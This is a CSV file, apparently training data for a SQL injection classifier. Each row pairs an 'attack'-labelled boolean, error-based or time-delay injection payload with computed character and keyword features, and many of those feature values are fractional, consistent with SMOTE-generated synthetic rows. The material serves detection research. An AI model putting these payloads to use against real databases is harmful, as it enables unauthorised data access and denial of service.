id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000128,attack,boolean,or 'a'  =  'a,nearest_attack_euclidean,R000015,0.029791777517174996,12.999999999999986,6.0,2.287783719941071,3.9642942005703006,0.03570579942969587,5.000000000000007,4.0,0.30494570773617724,0.002746599956130441,0.38461538461538464,0.3076923076923077,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000129,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000749,0.8026752700205642,133.33297618606457,30.0,3.8687080258593425,60.98378684387102,9.627026644516123,43.6983786843871,19.023784013290328,0.44496121984323045,0.07700091397831899,0.3335716059755101,0.1444662602029405,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,1.9999999999999998,0.3254053289032245,1.6745946710967754,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000130,attack,boolean,"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'cdaq' like 'cdaq",nearest_attack_euclidean,R000252,0.8312393817236992,166.0649853382493,33.46233431078338,4.130866604272663,84.15066275686648,9.0,52.376656892166196,20.53766568921662,0.5072245524931756,0.05430654613140251,0.3146797935927615,0.12378910778266042,4.0,0.0,0.0,0.0,1.0,1.4623343107833804,0.0,7.075331378433239,0.0,0.0,3.0,2.4623343107833806,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000131,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000081,0.8151161901318085,149.649348231226,34.235621175889435,3.9409335514849353,45.7068635276683,23.0,55.7068635276683,25.23562117588943,0.3051656431795807,0.1540180732409884,0.3721300228495757,0.1686862607298552,0.6178105879447156,0.0,2.0,0.0,0.0,2.0,0.0,10.617810587944716,0.0,2.0,1.0,10.0,0.6178105879447157,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000132,attack,boolean,"1'  )   as kgnd where 1550  =  1550 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000180,0.29440593725174613,138.0,35.00723459463615,3.8663545720318395,43.0,23.0,54.0,18.0,0.3115942028985507,0.16666666666666666,0.391304347826087,0.13043478260869565,3.0,0.0,2.0,0.9999999999999999,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000133,attack,boolean,"1%""   )    )     )   and elt  (  9524  =  1124,1124  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000608,0.295545377835711,84.9699326419503,18.320536951271006,2.802774674810634,9.427382601694674,13.0,45.86308699152662,16.679463048728994,0.11282165188808049,0.15388621968469343,0.5367700813808658,0.19652204704636028,0.0,3.9999999999999996,0.0,0.0,0.0,2.0,0.0,7.572617398305325,1.9999999999999998,0.10684565042366889,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000134,attack,boolean,"-8094  )   or elt  (  1032  =  1032,3623  )   and   (  4569  =  4569",nearest_attack_euclidean,R000755,1.2724232070617578,73.08488377768715,21.15095135356831,3.2156638238092623,6.613213515176227,24.0,33.54714593929506,8.924524323215845,0.09252037394089477,0.3302238997273843,0.4554782535548817,0.12177747277683922,0.0,0.0,1.0,0.0,0.4622621616079223,2.0,0.0,4.924524323215844,0.0,0.0,0.5377378383920777,3.462262161607922,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000135,attack,boolean,"1'||  (  select 'cqjw' from dual where 7335  =  7335 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",nearest_attack_euclidean,R000161,0.17301435275024868,173.7422157617126,34.916378361544915,4.25684345624501,85.24048593098208,16.418108192275444,50.16724327691018,21.91637836154491,0.48905622852433406,0.09509272382752733,0.28951815240430756,0.12633289524383112,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.1672432769101775,0.0,0.08362163845508863,1.9163783615449113,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,2.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,6.0
SMOTE_000136,attack,boolean,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eqyr' like 'eqyr",nearest_attack_euclidean,R000633,0.1136261415753853,144.62940403693676,31.251761614774708,4.147657306993591,86.0,8.125880807387354,35.25176161477471,15.251761614774708,0.5946994431778261,0.056165716068618796,0.2437185184207108,0.10541632233284426,4.0,0.0,0.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,2.1258808073873534,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000137,attack,boolean,"1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000202,0.25045158806953577,202.30383631017747,35.4547314561948,3.8379622292196265,59.9094629123896,32.0,78.9094629123896,31.484910485398267,0.2959656298493371,0.15834091490270288,0.38998054807281696,0.15571290717514302,1.0,0.0,2.0,0.0,0.0,2.0,0.0,16.484910485398267,0.0,1.0,3.0,10.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,7.0
SMOTE_000138,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000319,0.37422041080754154,275.84041839648984,38.84041839648981,3.8040952047814023,82.15958160351019,36.68083679297962,112.0,45.0,0.29785415301787416,0.13297517093797434,0.4060325841843629,0.16313809185978864,0.0,1.0,2.0,0.0,0.0,2.0,0.0,24.0,0.0,2.0,4.0,14.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.15958160351019168,0.8404183964898084,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,9.0
SMOTE_000139,attack,boolean,"1  )   as adzj where 5575  =  5575 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000360,0.14578106266531457,124.2875103844673,33.942497923106544,3.842515416197416,42.23000830757383,21.0,46.942497923106544,14.115004153786916,0.33973778407048816,0.16897738696712844,0.37774173258284877,0.11354309637953461,0.05750207689345843,0.0,2.0,0.0,1.0,2.0,0.0,7.0,0.0,1.0,1.0,5.057502076893458,0.05750207689345832,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0575020768934584,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.057502076893458
SMOTE_000140,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000759,0.09680114404299328,136.28397182068454,36.22717745654763,3.8117129036822974,42.22717745654762,23.0,53.943205635863094,17.113588728273815,0.3098127512318381,0.16877704673155278,0.39585635628704713,0.12555384574956202,2.0567943641369064,0.0,2.0,0.9999999999999999,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.056794364136906,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.05679436413690653,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0567943641369064
SMOTE_000141,attack,boolean,"1   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   5336  =  5336",nearest_attack_euclidean,R000574,0.795566214324377,229.6513022103661,32.7449814683237,3.5480766402718205,59.96654312215801,32.7449814683237,101.9598517465896,34.9799258732948,0.26026116363425283,0.14359751052381395,0.4443870839131152,0.15175424192881798,0.0,0.0,0.0,0.0,0.0,2.0,0.0,21.4899629366474,0.0,1.2483271561079003,3.2483271561079006,8.993308624431602,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.2483271561079003,0.7516728438920997,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.4966543122158,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,7.496654312215801
SMOTE_000142,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R000364,0.5881343478734559,86.52462576216502,22.71948602642611,3.2340631237634785,19.87794410570444,13.0,40.805139735738905,12.84154192072167,0.23114825446412027,0.15056065861390872,0.47026317957498687,0.14802790734698415,4.0,0.0,0.0,0.0,0.0,1.2805139735738904,0.0,6.56102794714778,0.0,0.0,1.0,1.2805139735738904,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000143,attack,boolean,-6144'  )   or 9385  =  2474--,nearest_attack_euclidean,R000126,0.4547361812157897,31.65862302604907,15.792672121743864,3.3181319298567558,2.0,12.0,11.24396726953681,6.4146557565122695,0.0637568017086858,0.382540810252115,0.35151998932071354,0.20218239871848565,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.2073278782561356,0.20732787825613472,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000144,attack,boolean,"1'  )   and elt  (  5245  =  9203,9203  )   and   (  'fhlw' like 'fhlw",nearest_attack_euclidean,R000566,0.00033045672997983886,69.99666248619305,23.998860361139094,3.7154087128695577,20.999430180569547,12.998941763914871,25.998697555587533,9.999592986121106,0.3000148770590217,0.18569916805592676,0.3714264060345359,0.14285954885051563,3.9999185972242213,0.0,0.0,0.0,0.0,1.0,0.0,3.999755791672663,0.0,0.0,0.9999185972242209,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.9999185972242213,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.9999185972242208
SMOTE_000145,attack,boolean,"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000591,0.1634496359882723,107.75420800388565,28.077861999757147,3.4406462383946272,31.0,13.0,47.909932003399945,15.844276000485706,0.28821343118077786,0.12086369694677779,0.4438420041610138,0.14708086771143056,1.0,0.0,2.0,0.0,1.0,1.0,0.0,8.76641400072856,0.07786199975714667,1.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000146,attack,boolean,"1%'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000737,0.23973745312723826,290.4219146774986,32.12054705071389,3.5428781910833793,51.54246172821249,71.0,128.0,39.87945294928611,0.17743871186147905,0.2444797870416533,0.4407522921314313,0.1373292089654363,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.0,1.8794529492861138,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0602735253569429,0.9397264746430569,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,8.0
SMOTE_000147,attack,boolean,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,nearest_attack_euclidean,R000004,0.05226270956699896,54.744325541873025,23.0,3.728968517053181,24.0,4.0,17.74432554187303,9.0,0.438429692590925,0.07307161543182084,0.32408755725565724,0.16441113472159688,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000148,attack,boolean,"1""   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""bxcb"" like ""bxcb",nearest_attack_euclidean,R000091,0.7023102198585093,385.7641827135021,31.584278847566807,3.3338558242632246,105.33711539026723,47.0,178.84278847566804,54.58427884756681,0.27306326586531715,0.12188114689320495,0.4635314218446584,0.1415241653968195,0.0,3.9999999999999996,0.0,0.0,0.0,2.4157211524331927,0.0,37.16855769513361,0.0,0.0,1.0,12.415721152433193,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000149,attack,boolean,1'||  (  select 'xdzp' from dual where 5786  =  5786 and   (  3020  =  3020  )  *6703  )  ||',nearest_attack_euclidean,R000254,1.7845256025077727,86.44052557276166,29.720262786380825,3.911406347702371,22.251728898720945,21.0,30.062932224680235,13.125864449360472,0.2553364805620314,0.24455545977569146,0.3491488232121479,0.15095923645012918,3.062932224680236,0.0,0.0,0.0,1.0,2.0,0.0,4.0,0.0,0.0,0.0,6.062932224680236,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.531466112340118,1.0,0.0,1.0,0.5314661123401179,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.531466112340118
SMOTE_000150,attack,boolean,"1""   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""vcjt"" like ""vcjt",nearest_attack_euclidean,R000130,0.14745359383844658,282.3981650950932,37.66018349049068,3.701395656568322,87.0,27.0,120.71853207607455,47.67963301901863,0.30816137263244775,0.09563628805834584,0.42737268504674136,0.16882965426246505,0.0,3.9999999999999996,0.0,0.0,0.0,1.0,0.0,26.67963301901863,0.0,2.0,4.0,11.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,9.0
SMOTE_000151,attack,boolean,"-9558"" where 7497  =  7497 or   (  2539  =  6484  )  *6484--",nearest_attack_euclidean,R000125,0.0604355592265214,60.253834001447686,20.03172925018096,3.5676122754192665,7.095187750542877,24.0,20.126917000723843,9.031729250180963,0.11763098701530372,0.3985068588150137,0.3339554754937443,0.14990667867593835,0.0,1.0,3.0,0.0,0.9682707498190394,2.0,0.0,2.0317292501809616,0.0,0.0,0.03172925018096029,5.968270749819039,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000152,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000640,0.0691306908275887,144.40386154994283,33.08654176070203,4.1632342538269045,76.20193077497142,16.0,37.17308352140407,15.028847253567346,0.5277067753955798,0.11082710158231868,0.25738313773445415,0.10408298528764748,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.028847253567345,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.028847253567344522,0.9711527464326556,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000153,attack,boolean,-4313%'  )   or 6872  =  6872 and   (  '%'  =  ',nearest_attack_euclidean,R000525,0.4385702763072346,56.05098665877321,20.74075387216718,3.3397812025892386,6.523159638146282,12.870376936083591,24.35188468041795,12.305565404125385,0.11221978660224402,0.2365603561340034,0.4283996890893621,0.2228201681743905,4.0,0.0,1.0,0.0,0.0,2.0,0.0,2.8703769360835896,1.9999999999999998,0.2175942340208975,0.21759423402089761,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000154,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000193,2.3057672329370718,255.45976362177527,36.91952724355056,3.8031367790445643,82.91952724355056,29.0,100.45976362177528,43.08047275644944,0.3245830090398257,0.11352124471459125,0.39324851962890883,0.16864722661667425,2.6207091346741627,0.0,0.0,0.0,0.0,1.5402363782247208,0.0,22.45976362177528,0.0,2.0,4.0,11.540236378224721,1.0,0.0,0.0,0.45976362177527924,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.5402363782247208,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,8.54023637822472
SMOTE_000155,attack,boolean,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lqpd'  =  'lqpd",nearest_attack_euclidean,R000642,0.7351537239310152,142.5554975886446,31.302219903545783,3.651458953917991,51.9732568170109,11.488900482271076,59.79112038581686,19.302219903545783,0.3587527209061758,0.08230463409510255,0.4229590694063868,0.13598357559233487,4.0,0.0,0.0,0.0,1.0,2.0,0.0,9.39556019290843,0.0,0.6977800964542151,1.3022199035457849,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
